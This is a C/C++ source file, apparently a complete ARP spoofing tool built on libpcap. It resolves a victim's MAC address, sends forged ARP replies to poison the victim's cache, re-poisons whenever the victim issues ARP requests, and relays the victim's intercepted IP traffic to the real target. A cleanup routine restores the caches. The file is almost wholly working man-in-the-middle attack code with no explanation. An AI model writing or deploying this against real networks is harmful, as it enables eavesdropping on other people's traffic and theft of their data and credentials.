#include <stdlib.h>
#include <pcap.h>
#include <libnet.h>
#include <stdbool.h>
#include <fcntl.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"

#define MAXTRYSENDARP 5
#define MAXWAITREPLY 5

#define IPSIPOFFSET 12
#define IPDIPOFFSET 16

static pthread_t thr;
static int thr_id;
static bool thr_exit = true;
static void* treturn;

void thr_start();
void thr_stop();
void* thr_function(void* arg);

Mac broadcast1 = Mac("ff:ff:ff:ff:ff:ff");
Mac broadcast2 = Mac("00:00:00:00:00:00");

struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};

bool sendArpPacket(char* interface, Mac* eth_smac, Mac* eth_dmac, Mac* arp_smac, Ip* arp_sip, Mac* arp_tmac, Ip* arp_tip, int option) {
	char* dev = interface;
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if(handle == nullptr)
                return false;

        EthArpPacket packet;

        memcpy(&packet.eth_.smac_, eth_smac, sizeof(Mac));
	memcpy(&packet.eth_.dmac_, eth_dmac, sizeof(Mac));
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
	if(option == 0)
        	packet.arp_.op_ = htons(ArpHdr::Request);
	else
		packet.arp_.op_ = htons(ArpHdr::Reply);
        memcpy(&packet.arp_.smac_, arp_smac, sizeof(Mac));
        memcpy(&packet.arp_.sip_, arp_sip, sizeof(Ip));
        memcpy(&packet.arp_.tmac_, arp_tmac, sizeof(Mac));
        memcpy(&packet.arp_.tip_, arp_tip, sizeof(Ip));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if(res != 0)
                return false;
        pcap_close(handle);
        return true;
}

bool catchUserMac(const u_char* packet, Mac* user_mac, Ip* user_ip) {
	ArpHdr arp_;
	memcpy(&arp_, packet + sizeof(EthHdr), sizeof(ArpHdr));
        if(arp_.op_ != htons(ArpHdr::Reply))		// determine whether arp reply
                return false;
        if(memcmp(user_ip, &arp_.sip_, sizeof(Ip)))	// check sender ip
                return false;
        memcpy(user_mac, &arp_.smac_, sizeof(Mac));
        return true;
}

bool isArpPacket(const u_char* packet) {
	EthHdr eth_;
	memcpy(&eth_, packet, sizeof(EthHdr));
	if(eth_.type_ != htons(ETHERTYPE_ARP))
		return false;
	return true;
}

bool isIpPacket(const u_char* packet) {
	EthHdr eth_;
	memcpy(&eth_, packet, sizeof(EthHdr));
	if(eth_.type_ != htons(ETHERTYPE_IP))
		return false;
	return true;
}

bool getUserMac(char* interface, Mac* attacker_mac, Ip* attacker_ip, Mac* user_mac, Ip* user_ip) {
	char* dev = interface;
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if(handle == nullptr)
		return false;

        int det = 0;
	int index;
        for(index = 0; index < MAXTRYSENDARP; index++) {
                if(sendArpPacket(interface, attacker_mac, &broadcast1, attacker_mac, attacker_ip, &broadcast2, user_ip, 0) == false)
			return false;
                for(int i = 0 ; i < MAXWAITREPLY ; i++) {
                        struct pcap_pkthdr* header;
                        const u_char* packet;
                        int res = pcap_next_ex(handle, &header, &packet);
                        if(res == 0) continue;
                        if(res == -1 || res == -2)
                                return false;
                        if(isArpPacket(packet) == false)
                                continue;
                        if(catchUserMac(packet, user_mac, user_ip) == true){
                                det = 1;
                                break;
                        }
                }
                if(det)
                        break;
        }
	if(index == MAXTRYSENDARP)
		return false;
        pcap_close(handle);
        return true;
}

bool beginSpoof(char* interface, Mac* attacker_mac, Ip* attacker_ip, Mac* sender_mac, Ip* sender_ip, Ip* target_ip, int flow) {
	for(int i = 0 ; i < flow ; i++) {
		if(sendArpPacket(interface, attacker_mac, &sender_mac[i], attacker_mac, &target_ip[i], &sender_mac[i], &sender_ip[i], 1) == false)
			return false;
	}
	return true;
}

int getArpSender(const u_char* packet, Ip* sender_ip, Ip* target_ip, int flow) {
	ArpHdr arp_;
        memcpy(&arp_, packet + sizeof(EthHdr), sizeof(ArpHdr));

        if(arp_.op_ != htons(ArpHdr::Request))
                return -1;

	for(int i = 0 ; i < flow ; i++) {
                if(memcmp(&arp_.sip_, &sender_ip[i], sizeof(Ip)) == 0) {
                        if(memcmp(&arp_.tip_, &target_ip[i], sizeof(Ip)) == 0) {
                                return i;
                        }
                }
        }
	return -1;
}

int getIpSender(const u_char* packet, Ip* sender_ip, Ip* target_ip, int flow) {
	Ip ipsip;
	Ip ipdip;
	memcpy(&ipsip, packet + sizeof(EthHdr) + IPSIPOFFSET, sizeof(Ip));
	memcpy(&ipdip, packet + sizeof(EthHdr) + IPDIPOFFSET, sizeof(Ip));

	for(int i = 0 ; i < flow ; i++) {
		if(memcmp(&ipsip, &sender_ip[i], sizeof(Ip)) == 0) {
			if(memcmp(&ipdip, &target_ip[i], sizeof(Ip)) == 0) {
				return i;
	                }
		}
	}
	return -1;
}

bool relayIpPacket(const u_char* packet, int packetlen, char* interface, Mac* attacker_mac, Mac* target_mac) {
	char* dev = interface;
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if(handle == nullptr)
                return false;

	EthHdr* eth_ = (EthHdr*) packet;
	memcpy(eth_->smac_, attacker_mac, sizeof(Mac));
	memcpy(eth_->dmac_, target_mac, sizeof(Mac));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(eth_), packetlen);
        if(res != 0)
                return false;
        pcap_close(handle);
	return true;
}

bool keepSpoof(char* interface, Mac* attacker_mac, Ip* attacker_ip, Mac* sender_mac, Ip* sender_ip, Mac* target_mac, Ip* target_ip, int flow) {
	thr_start();
	char* dev = interface;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == nullptr)
		return false;

	while(thr_exit == false) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if(res == 0) continue;
		if(res == -1 || res == -2)
			return false;
		int currentflow;
		if(isArpPacket(packet) == true) {
			currentflow = getArpSender(packet, sender_ip, target_ip, flow);
			if(currentflow == -1) {
				continue;
			}
			else {
				if(sendArpPacket(interface, attacker_mac, &sender_mac[currentflow], attacker_mac, &target_ip[currentflow], &sender_mac[currentflow], &sender_ip[currentflow], 1) == false) {
					printf("failed to send fake arp packet to sender%d\n", currentflow);
					continue;
				}
			}
		}
		else if(isIpPacket(packet) == true) {
			currentflow = getIpSender(packet, sender_ip, target_ip, flow);
			if(currentflow == -1)
				continue;
			else {
				if(relayIpPacket(packet, header->caplen, interface, attacker_mac, &target_mac[currentflow]) == false) {
					printf("failed to relay sender%d to target%d\n", currentflow, currentflow);
					continue;
				}
			}
		}
	}
	pcap_close(handle);
	return true;
}

void endSpoof(char* interface, Mac* attacker_mac, Mac* sender_mac, Ip* sender_ip, Mac* target_mac, Ip* target_ip, int flow) {
	for(int i = 0 ; i < flow ; i++)
		sendArpPacket(interface, attacker_mac, &sender_mac[i], &target_mac[i], &target_ip[i], &sender_mac[i], &sender_ip[i], 1);
}


void thr_start() {
        thr_exit = false;
        thr_id = pthread_create(&thr, NULL, thr_function, NULL);
}

void thr_stop() {
        thr_exit = true;
        thr_id = pthread_join(thr, &treturn);
}

void* thr_function(void* arg) {
        char input;
	do {
		input = getchar();
	} while(input != 'q');
	thr_stop();
        pthread_exit((void*)0);
}

